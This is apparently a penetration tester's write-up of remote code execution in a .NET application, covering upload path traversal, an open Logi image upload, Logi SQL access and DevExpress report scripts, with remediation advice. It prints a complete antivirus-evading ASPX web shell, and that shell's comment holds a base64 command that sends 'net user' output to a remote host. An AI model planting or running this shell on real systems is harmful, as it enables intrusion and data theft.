---
title:  "Bypassing Microsoft Defender, Logi Misconfigurations, and Remote Code Execution with DevExpress Report Scripts"
layout: post
date:   2026-09-24
---

The application I tested exposed multiple paths to remote code execution, as well as misconfigurations in the customer's DevExpress and Logi integrations. These issues enabled remote code execution and allowed unprivileged users to execute arbitrary SQL queries against databases. This post explores these attack paths, including abusing file uploads, bypassing antivirus software, and exploiting the misconfigured DevExpress and Logi integrations.

## Bypassing Microsoft Defender for Remote Code Execution
Over the years, I have encountered several assessments where uploading code files was possible, but antivirus software such as Microsoft Defender would detect and delete them. This made it difficult to turn an otherwise viable file upload vulnerability into code execution.

Using cmd.aspx from FuzzDB as a baseline, I investigated what Microsoft Defender was detecting and found that it appeared to flag certain keywords, including cmd. I then looked for an alternative way to invoke operating system commands without relying on the strings Defender was detecting.

C#/.NET can invoke native functions through DllImport, allowing managed code to call functions exported by native libraries. One option was the C system function from msvcrt.dll.

I chose system because the name itself was unlikely to be treated as a malicious indicator: System is fundamental to the .NET framework and appears throughout ordinary C# applications.

The code accepts a base64 encoded operating system command supplied by the user and decodes it at runtime before passing it to the system function. This helped to prevent the command from being hardcoded in the file and having antivirus software detect and delete the file.

Shown below is the new custom cmd.aspx file that bypasses antivirus software detection.
```csharp
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>

<script runat="server">
    [DllImport("msvcrt.dll")]
    static extern int system(string format);

    protected void Page_Load(object sender, EventArgs e)
    {
        // e.g. ?base=cG93ZXJzaGVsbC5leGUgSW52b2tlLVdlYlJlcXVlc3QgLVVyaSBodHRwOi8vbG9jYWxob3N0IC1NZXRob2QgUE9TVCAtQm9keSAkKG5ldCB1c2VyKQ==
        string baseValue= Request.QueryString["base"].ToString();
        byte[] data = Convert.FromBase64String(baseValue);
        string decodedString = Encoding.UTF8.GetString(data);
        Response.Write(system(decodedString));
    }
</script>
```

### File Upload Remote Code Execution
I originally wrote this cmd.aspx file several years ago but never had an opportunity to use it during an assessment. In previous engagements, uploaded files were commonly stored in S3 buckets, ASPX uploads were explicitly blocked, or there was no viable path for the web server to execute the uploaded file.

That changed during this assessment. I identified an upload function protected by antivirus software and found that path traversal using an absolute path was possible to write the ASPX file to a directory from which the web server could execute it.

The application also exposed detailed error stack traces. These revealed the installation path of the application and source code, which helped me identify a suitable location for the uploaded file.

With the upload, path traversal, and executable location identified, I was able to upload the cmd.aspx file and turn the file upload functionality into remote code execution.

<figure>
  <img src="/assets/images/2026/antivirus-error.png">
  <figcaption>Figure 1 – Uploaded FuzzDB cmd.aspx to the server and confirmed Microsoft Defender deleted the file</figcaption>
</figure>

<figure>
  <img src="/assets/images/2026/rce-file-upload-1.png">
  <figcaption>Figure 2 – Uploaded the new cmd.aspx file using path traversal</figcaption>
</figure>

<figure>
  <img src="/assets/images/2026/rce-file-upload-2.png">
  <figcaption>Figure 3 – Successfully called the new cmd.aspx code file with a base64 encoded OS command</figcaption>
</figure>

<figure>
  <img src="/assets/images/2026/rce-file-upload-2.png">
  <figcaption>Figure 4 – OS command executed to send Windows user information to my remote server</figcaption>
</figure>

## Remote Code Execution with Logi Image Upload and SQL Query Execution
The application used a third-party platform called Logi to build dashboards and visualizations. This was my first assessment involving Logi in a .NET application, so I spent some time investigating its various features.

### Remote Code Execution with Logi Image Upload
When creating a new visual, Logi provides an option to upload an image. I discovered that the upload functionality did not restrict the file type and would accept arbitrary files.

I was able to reuse the cmd.aspx file from the previous section and upload it through the image upload functionality, resulting in remote code execution on the server.

<figure>
  <img src="/assets/images/2026/logi-rce-1.png">
  <figcaption>Figure 5 – Logi Visual page to upload a new image</figcaption>
</figure>

<figure>
  <img src="/assets/images/2026/logi-rce-2.png">
  <figcaption>Figure 6 – Uploaded the new cmd.aspx file again for the Logi image upload</figcaption>
</figure>

<figure>
  <img src="/assets/images/2026/logi-rce-3.png">
  <figcaption>Figure 7 – Successfully called the new cmd.aspx code file with a base64 encoded OS command</figcaption>
</figure>

<figure>
  <img src="/assets/images/2026/logi-rce-4.png">
  <figcaption>Figure 8 – OS command executed to send directory information to my remote server</figcaption>
</figure>

### Exploiting a Logi Misconfiguration
While investigating Logi, I discovered functionality called the [Web Metadata Builder](https://devnet.logianalytics.com/hc/en-us/articles/4419715531671-Using-the-Web-Metadata-Builder#Metadata), which can be accessed through the following endpoint:
```
https://host.com/redacted/rdPage.aspx?rdReport=rdTemplate/rdMetadata/Connections
```

The application was misconfigured to allow low-privileged users to access the Web Metadata Builder. From there, I was able to use its database functionality to execute arbitrary SQL queries against multiple databases.

This effectively allowed users with limited application privileges to interact directly with databases they would not otherwise have access to.

<figure>
  <img src="/assets/images/2026/fb-logi-1.png">
  <figcaption>Figure 9 – Accessed Web Metadata Builder page</figcaption>
</figure>

<figure>
  <img src="/assets/images/2026/fb-logi-2.png">
  <figcaption>Figure 10 – Metadata Definition page was accessed</figcaption>
</figure>

<figure>
  <img src="/assets/images/2026/fb-logi-3.png">
  <figcaption>Figure 11 – Executed an SQL query to list tables in a database</figcaption>
</figure>

## Exploiting DevExpress Report Scripts
The application had a Reports section where users could upload .rpx files and open them in the DevExpress Report Designer by clicking the Edit button. I downloaded an existing report from the application and inspected its XML. I noticed that the report contained C# code within a &lt;Script&gt; tag.

DevExpress documents that [report scripts](https://docs.devexpress.com/XtraReports/2593/feature-guide-to-devexpress-reports/reporting-api/use-report-scripts) are not secure and are disabled by default. In this application, however, scripting was enabled.

To test the impact, I added System.Diagnostics.Process.Start to the &lt;Script&gt; section of an .rpx file and uploaded it to the application. Clicking the Preview button caused the report to execute code through the ActiveReport_ReportStart() event, resulting in remote code execution on the server.

<figure>
  <img src="/assets/images/2026/rce-devexpress-1.png">
  <figcaption>Figure 12 – Modified .rpx file to add OS command in Report Scripts section</figcaption>
</figure>

<figure>
  <img src="/assets/images/2026/rce-devexpress-2.png">
  <figcaption>Figure 13 – OS command triggered when previewing the report</figcaption>
</figure>

## Remediation
For the file uploads, the recommendations were to validate uploads and only allow the file types required for each upload to function. Applications should also use the filename rather than accepting full paths and verify that uploaded files cannot be written to arbitrary locations on the server.

For the Logi Web Metadata Builder, the application should either disable the builder altogether or restrict access to privileged users who require the functionality.

For DevExpress, the default configuration should be used by removing the code change to enable report scripts.
